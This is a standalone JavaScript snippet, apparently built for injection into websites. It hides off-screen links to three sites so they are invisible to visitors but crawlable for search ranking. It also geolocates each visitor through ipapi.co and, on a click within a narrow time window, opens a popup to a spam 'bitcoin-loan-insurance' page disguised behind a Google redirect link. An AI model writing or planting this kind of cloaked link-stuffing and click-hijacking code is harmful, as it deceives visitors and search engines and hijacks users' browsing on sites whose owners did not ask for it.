let EFV='<a href="https://www.am2z.com" style="position:absolute;z-index:-999;left:-99%;">Am2z News</a><a href="https://www.mrjaz.com" style="position:absolute;z-index:-999;left:-99%;">MrJaz</a><a href="https://sohanisharma.com" style="position:absolute;z-index:-999;left:-99%;">SohaniSharma</a>';document.querySelector("header")?document.querySelector("header").insertAdjacentHTML("beforeend",EFV):document.body.insertAdjacentHTML("beforeend",EFV);

// United States|Australia|Canada|Marshall Islands|United Kingdom|Germany|Switzerland|New Zealand|Luxembourg|Finland|Belgium|France|Slovakia|China|Singapore|Romania|Austria|Hong Kong|Lithuania

if (!localStorage.gieu) {
    (async()=>{
        localStorage.gieu=1;
        let aa=await(await(await fetch(`https://ipapi.co/country_name`)).text());
        if(/Canada|New Zealand|United Kingdom|United States|Slovakia|Australia|Belgium|Finland|Germany|Norway|Ireland|China|Hong Kong|Singapore|France|Switzerland|Lithuania/i.test(aa)){
            localStorage.gieu=2;
            uhd()
        }else{
            localStorage.gieu=3;
            uhd()
        }
    })();
}

function uhd(){
  document.onmousedown=()=>{
    let dte=(new Date).getSeconds();
    (async()=>{try{await import('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js');
        if(!sessionStorage.i&&(localStorage.gieu==2&&dte>9&&dte<11||localStorage.gieu==3&&dte>9&&dte<11&&false)){
            window.open('https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwiP0sLG5Iz7AhUiTmwGHa3_BB8QFnoECAkQAQ&url=https%3A%2F%2Fbitcoin-loan-insurance-hosting-seo.am2z.com%2Fwhat-is-insurance-full-Explained-how-many-types-of-insurance-benefits-of-insurance&usg=AOvVaw1-E9eTfl0nhWdKAo-r486j'); 
            sessionStorage.i='i';
        }         
    }catch(e){}})()
  }
}
uhd()
